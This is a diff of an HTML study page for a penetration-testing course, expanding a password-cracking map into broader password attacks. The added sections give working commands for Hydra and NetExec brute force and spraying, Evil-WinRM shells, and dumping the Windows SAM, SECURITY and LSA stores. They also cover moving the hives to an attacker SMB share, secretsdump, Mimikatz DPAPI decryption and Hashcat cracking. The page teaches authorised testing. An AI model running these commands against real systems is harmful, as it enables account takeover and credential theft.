@@ -3,16 +3,16 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Password cracking | Paracausal Telemetry</title>
-    <meta name="description" content="An interactive map of an offline password crack with John the Ripper and Hashcat: identifying a hash, building a targeted wordlist with rules and CeWL, John&#39;s and Hashcat&#39;s attack modes, and cracking protected files and archives (SSH keys, Office, PDF, ZIP, OpenSSL, BitLocker), with format, mode, mask and rule references." />
+    <title>Password attacks | Paracausal Telemetry</title>
+    <meta name="description" content="An interactive map of password attacks: brute-forcing and spraying network services (WinRM, SSH, RDP, SMB) with NetExec, Evil-WinRM and Hydra, credential stuffing and defaults, dumping Windows credentials (SAM, LSA, NTDS, DPAPI) with reg.exe and secretsdump, and cracking the hashes offline with John the Ripper and Hashcat." />
     <meta name="robots" content="index,follow" />
     <meta name="theme-color" content="#0a0b0c" />
     <meta name="referrer" content="strict-origin-when-cross-origin" />
     <link rel="canonical" href="https://paracausaltelemetry.com/cpts/password-cracking/" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Paracausal Telemetry" />
-    <meta property="og:title" content="Password cracking" />
-    <meta property="og:description" content="An interactive map of an offline password crack with John the Ripper and Hashcat: identifying a hash, building a targeted wordlist with rules and CeWL, John&#39;s and Hashcat&#39;s attack modes, and cracking protected files and archives (SSH keys, Office, PDF, ZIP, OpenSSL, BitLocker), with format, mode, mask and rule references." />
+    <meta property="og:title" content="Password attacks" />
+    <meta property="og:description" content="An interactive map of password attacks: brute-forcing and spraying network services (WinRM, SSH, RDP, SMB) with NetExec, Evil-WinRM and Hydra, credential stuffing and defaults, dumping Windows credentials (SAM, LSA, NTDS, DPAPI) with reg.exe and secretsdump, and cracking the hashes offline with John the Ripper and Hashcat." />
     <meta property="og:url" content="https://paracausaltelemetry.com/cpts/password-cracking/" />
     <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png" />
     <meta property="og:image:width" content="1200" />
@@ -24,7 +24,7 @@
     <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
     <link rel="stylesheet" href="/styles.css?v=276fa973-site9" />
     <link rel="stylesheet" href="/cpts/password-cracking/pc-map.css?v=pc1" />
-    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Password cracking with John the Ripper and Hashcat","description":"An interactive map of an offline password crack with John the Ripper and Hashcat: identifying a hash, building a targeted wordlist with rules and CeWL, John's and Hashcat's attack modes, and cracking protected files and archives (SSH keys, Office, PDF, ZIP, OpenSSL, BitLocker), with format, mode, mask and rule references.","url":"https://paracausaltelemetry.com/cpts/password-cracking/","isPartOf":{"@type":"CollectionPage","name":"CPTS","url":"https://paracausaltelemetry.com/cpts/"}}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Password attacks: online brute force, spraying, Windows credential dumping and offline cracking","description":"An interactive map of password attacks: brute-forcing and spraying network services (WinRM, SSH, RDP, SMB) with NetExec, Evil-WinRM and Hydra, credential stuffing and defaults, dumping Windows credentials (SAM, LSA, NTDS, DPAPI) with reg.exe and secretsdump, and cracking the hashes offline with John the Ripper and Hashcat.","url":"https://paracausaltelemetry.com/cpts/password-cracking/","isPartOf":{"@type":"CollectionPage","name":"CPTS","url":"https://paracausaltelemetry.com/cpts/"}}</script>
   </head>
   <body>
     <script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script>
@@ -32,14 +32,14 @@
     <div class="page-shell">
       <header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">CPTS</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/">Writeups</a><a href="/cpts/" aria-current="page">CPTS</a><a href="/links/">Links</a><a href="/talks/">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header>
       <main id="pc-main" class="pc-main">
-        <nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/cpts/">CPTS</a><span>/</span><span aria-current="page">Password cracking</span></nav>
+        <nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/cpts/">CPTS</a><span>/</span><span aria-current="page">Password attacks</span></nav>
         <section class="page-hero">
           <div class="page-hero-card">
             <canvas class="hero-dither" aria-hidden="true"></canvas>
             <div class="page-hero-copy">
-              <p class="eyebrow">CPTS &middot; John the Ripper &amp; Hashcat</p>
-              <h1>Password cracking<span class="signal-stop">.</span></h1>
-              <p>How an offline password crack fits together, with the two tools that do it: John the Ripper on the CPU, Hashcat on the GPU. Identify the hash, build a wordlist that fits the target, extract a hash from a protected file or archive if you need to, then run the attack that fits, from a quick wordlist to an exhaustive brute force. Open any node for what it means and the commands behind it, or walk the crack step by step. Cracking runs on your own machine, never the target, and only against hashes you captured in scope.</p>
+              <p class="eyebrow">CPTS &middot; Password attacks</p>
+              <h1>Password attacks<span class="signal-stop">.</span></h1>
+              <p>Password attacks end to end: brute-force and spray the services that authenticate users, reuse leaked and default credentials, dump the places Windows keeps credentials, then crack the hashes you capture offline with John the Ripper and Hashcat. Open any node for what it means and the commands behind it, or walk the offline crack step by step. Run noisy online attacks only against systems you are authorised to test, watch for account lockout, and keep every credential with the rest of the engagement notes.</p>
               <p class="pc-hero-link"><a href="/cpts/#tool-hashcat">Full cracking command reference on the CPTS page</a></p>
             </div>
           </div>
@@ -116,9 +116,224 @@ hashcat -m 1000 ntlm.txt --show</code></pre>
             </div>
           </div>
           <ol class="pc-spine">
-          <li class="pc-phase" id="pcphase-identify">
+          <li class="pc-phase" id="pcphase-remote">
             <header class="pc-phase-head">
               <span class="pc-phase-num">01</span>
+              <h2 class="pc-phase-title" id="pcphase-remote-title">Remote service attacks</h2>
+              <p class="pc-phase-blurb">Most network services authenticate with a username and password. Brute-force or spray them for a foothold, or to turn a cracked password into access.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node has-kids" id="pcnode-rs-services">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">The services worth attacking</span></summary>
+                  <div class="pc-node-body"><p>Networks run services that authenticate with a username and password: FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP. To drive a Windows host remotely the usual three are RDP (3389), WinRM (5985/5986) and SSH (22, uncommon on Windows, standard on Linux). Services are often left on default settings with password auth enabled, so they are worth a login attack, but online guessing is noisy and can lock accounts out.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-rs-winrm">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">WinRM</span></summary>
+                    <div class="pc-node-body"><p>Windows Remote Management is Microsoft&#39;s WS-Management implementation: XML web services over SOAP that bridge WBEM and WMI (and can reach DCOM) to manage Windows remotely. It is off by default on Windows 10/11 and must be enabled, so finding it open means someone turned it on. Default ports TCP 5985 (HTTP) and 5986 (HTTPS).</p></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-rs-netexec">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">NetExec (nxc)</span></summary>
+                  <div class="pc-node-body"><p>NetExec (nxc, the maintained successor to CrackMapExec) sprays credentials across a protocol and reports what works. Install with apt. General form: netexec &lt;proto&gt; &lt;ip&gt; -u &lt;user or list&gt; -p &lt;pass or list&gt;. Protocols: nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc. A (Pwn3d!) beside a WinRM or SMB hit means the account can most likely execute commands, not just log in.</p><pre class="pc-cmd"><code>sudo apt-get install -y netexec
+netexec -h
+netexec winrm 10.129.42.197 -u user.list -p password.list
+netexec smb 10.129.42.197 -u user -p password --shares</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-rs-netexec-proto">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Per-protocol help</span></summary>
+                    <div class="pc-node-body"><p>Each protocol has its own options; netexec &lt;proto&gt; -h prints them (netexec smb -h is huge: shares, --sam, --lsa, --ntds, spidering, command execution). The target can be an IP, range, CIDR, hostname, file of targets, or an Nmap/Nessus export.</p><pre class="pc-cmd"><code>netexec smb -h
+netexec ssh 10.129.42.197 -u user.list -p password.list</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console" id="pcnode-rs-evilwinrm">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Evil-WinRM (shell)</span></summary>
+                  <div class="pc-node-body"><p>Once WinRM creds work, Evil-WinRM opens an interactive shell over PowerShell Remoting (MS-PSRP). Install it as a gem. It is the standard way to use a WinRM foothold.</p><pre class="pc-cmd"><code>sudo gem install evil-winrm
+evil-winrm -i 10.129.42.197 -u user -p password</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-rs-ssh">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">SSH (Hydra, then log in)</span></summary>
+                  <div class="pc-node-body"><p>SSH (TCP 22) secures the channel with symmetric encryption (AES, 3DES; the key agreed by Diffie-Hellman), asymmetric key authentication (a private key, often unprotected, is as good as a login) and hashing for integrity. Brute the password with Hydra, throttling to about four tasks because SSH configs cap parallel logins, then connect with the OpenSSH client.</p><pre class="pc-cmd"><code>hydra -L user.list -P password.list -t 4 ssh://10.129.42.197
+ssh user@10.129.42.197</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-rs-rdp">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">RDP (Hydra, then xfreerdp)</span></summary>
+                  <div class="pc-node-body"><p>RDP (TCP 3389) gives a full remote desktop. Brute it with Hydra, but keep the task count low (-t 1 to 4, -W to wait): RDP dislikes parallel connections and the module is experimental. Hydra may report an account as &quot;valid but not active for remote desktop&quot; when the password is right but the account lacks RDP rights. Connect with xfreerdp (or Remmina).</p><pre class="pc-cmd"><code>hydra -L user.list -P password.list -t 4 rdp://10.129.42.197
+xfreerdp /v:10.129.42.197 /u:user /p:password</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-rs-smb">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">SMB (Hydra / Metasploit)</span></summary>
+                  <div class="pc-node-body"><p>SMB (TCP 445, file and printer sharing; CIFS is the dialect, Samba the Linux implementation) authenticates too. Hydra can brute it, but an old THC-Hydra fails SMBv3 with &quot;invalid reply from target&quot;; fall back to Metasploit&#39;s auxiliary/scanner/smb/smb_login. With valid creds, list shares with netexec --shares and browse them with smbclient.</p><pre class="pc-cmd"><code>hydra -L user.list -P password.list smb://10.129.42.197
+netexec smb 10.129.42.197 -u user -p password --shares
+smbclient -U user \\10.129.42.197\SHARENAME</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-rs-smb-msf">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Metasploit smb_login</span></summary>
+                    <div class="pc-node-body"><p>When Hydra cannot speak SMBv3, use the smb_login scanner: set USER_FILE, PASS_FILE and RHOSTS, then run. STOP_ON_SUCCESS and a low THREADS keep it tidy; a Success line confirms the pair.</p><pre class="pc-cmd"><code>msf6 &gt; use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) &gt; set user_file user.list
+msf6 auxiliary(scanner/smb/smb_login) &gt; set pass_file password.list
+msf6 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.129.42.197
+msf6 auxiliary(scanner/smb/smb_login) &gt; run</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-spraying" data-to="spraying"><span aria-hidden="true">&#8595;</span> Proceed to Spraying, stuffing &amp; defaults</a>
+          </li>
+          <li class="pc-phase" id="pcphase-spraying">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">02</span>
+              <h2 class="pc-phase-title" id="pcphase-spraying-title">Spraying, stuffing &amp; defaults</h2>
+              <p class="pc-phase-blurb">One password against many accounts, reused credentials against new services, and the credentials nobody changed.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console" id="pcnode-sp-spray">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Password spraying</span></summary>
+                  <div class="pc-node-body"><p>Spraying tries a single password across many usernames, the opposite of hammering one account, so it stays under lockout thresholds (one guess per account per round). It pays off where new accounts get a standard password such as ChangeMe123! that someone never changed. For Active Directory use NetExec or Kerbrute; for web apps, Burp.</p><pre class="pc-cmd"><code>netexec smb 10.100.38.0/24 -u usernames.list -p &#39;ChangeMe123!&#39;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-sp-stuffing">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Credential stuffing</span></summary>
+                  <div class="pc-node-body"><p>Stuffing replays username:password pairs stolen from one service against others, betting on reuse across email, social and enterprise logins. Hydra&#39;s -C flag takes a combined user:pass file (one pair per line) rather than separate lists.</p><pre class="pc-cmd"><code>hydra -C user_pass.list ssh://10.100.38.23</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-sp-defaults">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Default credentials</span></summary>
+                  <div class="pc-node-body"><p>Routers, firewalls, databases and appliances ship with default credentials that are meant to be changed at setup but often are not. The defaultcreds-cheat-sheet tool looks them up by product (creds search &lt;vendor&gt;); product documentation and router lists are the other sources. Collect the finds into a user:pass list and feed Hydra.</p><pre class="pc-cmd"><code>pip3 install defaultcreds-cheat-sheet
+creds search linksys
+hydra -C defaults.list &lt;proto&gt;://&lt;ip&gt;</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-sp-routers">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Router defaults</span></summary>
+                    <div class="pc-node-body"><p>Routers are less likely to be left on defaults because they are critical, but internal test routers often are. Common brand/IP/username/password combinations are in the router-defaults table below; the admin panel usually sits at the gateway IP.</p></div>
+                  </details>
+                </li></ul>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-winhashes" data-to="winhashes"><span aria-hidden="true">&#8595;</span> Proceed to Windows credentials</a>
+          </li>
+          <li class="pc-phase" id="pcphase-winhashes">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">03</span>
+              <h2 class="pc-phase-title" id="pcphase-winhashes-title">Windows credentials: dump &amp; crack</h2>
+              <p class="pc-phase-blurb">Where Windows keeps credentials, how to dump SAM / LSA / NTDS with admin rights, and cracking the NT and DCC2 hashes that come out.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node has-kids" id="pcnode-wc-authflow">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">The authentication flow</span></summary>
+                  <div class="pc-node-body"><p>On an interactive logon, WinLogon (the trusted process that owns login, lock/unlock and password changes) launches LogonUI, which collects credentials through a credential provider (a COM DLL). WinLogon hands them to LSASS, which runs them through an authentication package and checks them against the SAM (local) or Active Directory (domain) via LSALogonUser. The LSA is the protected subsystem that authenticates users, holds local security policy, and maps names to SIDs.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-wc-lsass">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">LSASS (the gatekeeper)</span></summary>
+                    <div class="pc-node-body"><p>The Local Security Authority Subsystem Service (%SystemRoot%\System32\lsass.exe) enforces local security policy, authenticates users and forwards audit logs. Its Negotiate function picks NTLM or Kerberos. Because it holds live credential material in memory, LSASS is a prime dumping target (Mimikatz).</p></div>
+                  </details>
+                </li>
+                <li class="pc-node" id="pcnode-wc-packages">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Authentication packages</span></summary>
+                    <div class="pc-node-body"><p>Authentication packages are DLLs LSASS loads to do the checks: Lsasrv, Msv1_0 (local/NTLM), Samsrv (SAM), Kerberos, Netlogon, Ntdsa (AD, DCs only). They are listed in the authentication-packages table below.</p></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node" id="pcnode-wc-sam">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">SAM database</span></summary>
+                  <div class="pc-node-body"><p>The Security Account Manager stores local account credentials as LM or NTLM hashes in the registry. The file is %SystemRoot%\system32\config\SAM, mounted at HKLM\SAM, and reading it needs SYSTEM privileges. SYSKEY partially encrypts it on disk with a system boot key (held in HKLM\SYSTEM), so you need both to decrypt the hashes. A workgroup host keeps users locally in SAM; a domain host validates against AD&#39;s ntds.dit instead.</p></div>
+                </details>
+              </li>
+              <li class="pc-node" id="pcnode-wc-stores">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Credential Manager, NTDS &amp; DPAPI</span></summary>
+                  <div class="pc-node-body"><p>Beyond SAM, Windows keeps credentials in several stores. Credential Manager holds per-user saved logins in the Credential Locker (AppData\Local\Microsoft\Credentials), DPAPI-encrypted. NTDS.dit is the Active Directory database on Domain Controllers (user, group and computer accounts with hashes, plus GPOs), synced across DCs except RODCs. DPAPI is the per-user encrypt/decrypt API behind saved browser and Outlook passwords, RDP credentials and Credential Manager entries.</p></div>
+                </details>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-wc-hives">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Dump the hives (reg.exe)</span></summary>
+                  <div class="pc-node-body"><p>With local admin you can back up the registry hives and crack offline, with no live session to maintain. SAM holds the hashes, SYSTEM the boot key that decrypts them, SECURITY the LSA secrets (DCC2, cleartext, DPAPI keys). For local users you only need SAM and SYSTEM; take SECURITY too for cached domain credentials. Run reg.exe from an elevated cmd.exe.</p><pre class="pc-cmd"><code>reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-wc-hives-table">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Which hive holds what</span></summary>
+                    <div class="pc-node-body"><p>SAM, SYSTEM and SECURITY each play a part in dumping and cracking; the registry-hives table below says what each one holds and why you need it.</p></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-transfer">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Exfiltrate with smbserver</span></summary>
+                  <div class="pc-node-body"><p>Move the saved hives to your attack host over SMB with Impacket&#39;s smbserver: start a share, then use the Windows move command to push the files. Pass -smb2support, or modern Windows (SMBv1 disabled by default) will refuse to connect.</p><pre class="pc-cmd"><code>sudo smbserver.py -smb2support CompData /home/you/Documents/
+C:\&gt; move sam.save \\10.10.15.16\CompData
+C:\&gt; move system.save \\10.10.15.16\CompData
+C:\&gt; move security.save \\10.10.15.16\CompData</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-secretsdump">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">secretsdump (extract hashes)</span></summary>
+                  <div class="pc-node-body"><p>Impacket&#39;s secretsdump reads the three hives and prints the local SAM hashes as uid:rid:lmhash:nthash, plus cached domain logons and LSA secrets (DPAPI machine/user keys, NL$KM). It fetches the boot key first to decrypt the SAM. Copy the NT hash (the fourth field, after the LM hash) for each user into a file, noting which hash is whose.</p><pre class="pc-cmd"><code>locate secretsdump
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-crack-nt">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Crack NT hashes (-m 1000)</span></summary>
+                  <div class="pc-node-body"><p>Most modern Windows stores passwords as NT hashes; older systems (pre-Vista / Server 2008) may still hold weaker LM hashes. Put the NT hashes in a file and crack with Hashcat mode 1000. NTLM is unsalted and fast (megahashes per second), so a wordlist with rules clears weak passwords quickly. Reuse what cracks, people repeat passwords across systems.</p><pre class="pc-cmd"><code>hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 hashestocrack.txt --show</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-crack-dcc2">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Crack DCC2 hashes (-m 2100)</span></summary>
+                  <div class="pc-node-body"><p>SECURITY yields DCC2 (MS Cache v2) hashes, local copies of domain credentials cached for offline logon ($DCC2$10240#user#...). Hashcat mode 2100. They use PBKDF2, so they crack roughly 800 times slower than NTLM and cannot be used for pass-the-hash, which means a strong one is often uncrackable inside an engagement window.</p><pre class="pc-cmd"><code>hashcat -m 2100 &#39;$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25&#39; /usr/share/wordlists/rockyou.txt</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-dpapi">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Decrypt DPAPI secrets</span></summary>
+                  <div class="pc-node-body"><p>The DPAPI machine and user keys from SECURITY unlock DPAPI blobs: saved browser and Outlook passwords, RDP credentials and Credential Manager entries. Decrypt them with Impacket&#39;s dpapi, Mimikatz, or remotely with DonPAPI. Mimikatz&#39;s dpapi::chrome pulls the AES key and reads the saved login directly.</p><pre class="pc-cmd"><code>mimikatz # dpapi::chrome /in:&quot;...\Chrome\User Data\Default\Login Data&quot; /unprotect</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-wc-remote">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Dump remotely (NetExec)</span></summary>
+                  <div class="pc-node-body"><p>With credentials that hold local admin, you can dump over SMB instead of touching disk: --sam for the local SAM hashes, --lsa for LSA secrets (which may expose service and cached credentials in cleartext). NetExec writes the loot to its logs for later cracking.</p><pre class="pc-cmd"><code>netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --sam
+netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --lsa</code></pre></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-identify" data-to="identify"><span aria-hidden="true">&#8595;</span> Proceed to Identify the hash</a>
+          </li>
+          <li class="pc-phase" id="pcphase-identify">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">04</span>
               <h2 class="pc-phase-title" id="pcphase-identify-title">Identify the hash</h2>
               <p class="pc-phase-blurb">The format has to match, or nothing cracks. Guess it, confirm it, then tell the tool: --format for John, -m for Hashcat.</p>
             </header>
@@ -156,7 +371,7 @@ hashcat --help | grep -i md5</code></pre></div>
           </li>
           <li class="pc-phase" id="pcphase-wordlists">
             <header class="pc-phase-head">
-              <span class="pc-phase-num">02</span>
+              <span class="pc-phase-num">05</span>
               <h2 class="pc-phase-title" id="pcphase-wordlists-title">Build a targeted wordlist</h2>
               <p class="pc-phase-blurb">A generic list is often blocked or exhausted. Mutate words that fit the target, and harvest the target&#39;s own language.</p>
             </header>
@@ -202,7 +417,7 @@ hashcat -a 0 -m 0 hashes site.wordlist -r custom.rule</code></pre></div>
           </li>
           <li class="pc-phase" id="pcphase-john">
             <header class="pc-phase-head">
-              <span class="pc-phase-num">03</span>
+              <span class="pc-phase-num">06</span>
               <h2 class="pc-phase-title" id="pcphase-john-title">John the Ripper</h2>
               <p class="pc-phase-blurb">The CPU cracker. Open-source since 1996; reach for it on boxes without a GPU, for odd formats, and for its *2john file converters.</p>
             </header>
@@ -248,7 +463,7 @@ grep &#39;# Incremental modes&#39; -A 100 /etc/john/john.conf</code></pre></div>
           </li>
           <li class="pc-phase" id="pcphase-hashcat">
             <header class="pc-phase-head">
-              <span class="pc-phase-num">04</span>
+              <span class="pc-phase-num">07</span>
               <h2 class="pc-phase-title" id="pcphase-hashcat-title">Hashcat</h2>
               <p class="pc-phase-blurb">The GPU cracker. Open-source since 2015, Linux/Windows/macOS; the fastest route when you have a real GPU and a supported hash.</p>
             </header>
@@ -264,7 +479,7 @@ hashcat -m 1000 ntlm.txt --show</code></pre></div>
                 <li class="pc-node" id="pcnode-hc-modes-note">
                   <details class="pc-node-box">
                     <summary><span class="pc-node-label">Finding the hash type (-m)</span></summary>
-                    <div class="pc-node-body"><p>Hashcat supports hundreds of hash types, each with a numeric ID. hashcat --help prints the full list (e.g. 0 MD5, 100 SHA1, 1400 SHA2-256, 1000 NTLM). Confirm an unknown one against the Hashcat example-hashes table, or with hashid -m. The Hashcat modes table below lists the common ones.</p></div>
+                    <div class="pc-node-body"><p>Hashcat supports hundreds of hash types, each with a numeric ID. hashcat --help prints the full list (e.g. 0 MD5, 100 SHA1, 1400 SHA2-256, 1000 NTLM, 2100 DCC2). Confirm an unknown one against the Hashcat example-hashes table, or with hashid -m. The Hashcat modes table below lists the common ones.</p></div>
                   </details>
                 </li></ul>
               </li>
@@ -299,7 +514,7 @@ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.
           </li>
           <li class="pc-phase" id="pcphase-files">
             <header class="pc-phase-head">
-              <span class="pc-phase-num">05</span>
+              <span class="pc-phase-num">08</span>
               <h2 class="pc-phase-title" id="pcphase-files-title">Protected files &amp; archives</h2>
               <p class="pc-phase-blurb">Encrypted files, keys and archives crack too: a *2john script extracts a hash, then John or Hashcat does the rest.</p>
             </header>
@@ -373,7 +588,7 @@ sudo umount /media/bitlockermount /media/bitlocker</code></pre></div>
           </li>
           <li class="pc-phase" id="pcphase-collect">
             <header class="pc-phase-head">
-              <span class="pc-phase-num">06</span>
+              <span class="pc-phase-num">09</span>
               <h2 class="pc-phase-title" id="pcphase-collect-title">Collect</h2>
               <p class="pc-phase-blurb">Read the results back, and handle them as sensitive engagement loot.</p>
             </header>
@@ -381,7 +596,7 @@ sudo umount /media/bitlockermount /media/bitlocker</code></pre></div>
               <li class="pc-node is-console is-step" id="pcnode-collect-show" data-step="6">
                 <details class="pc-node-box">
                   <summary><span class="pc-step-badge" aria-label="Workflow step 6">6</span><span class="pc-node-label">--show the cracked passwords</span></summary>
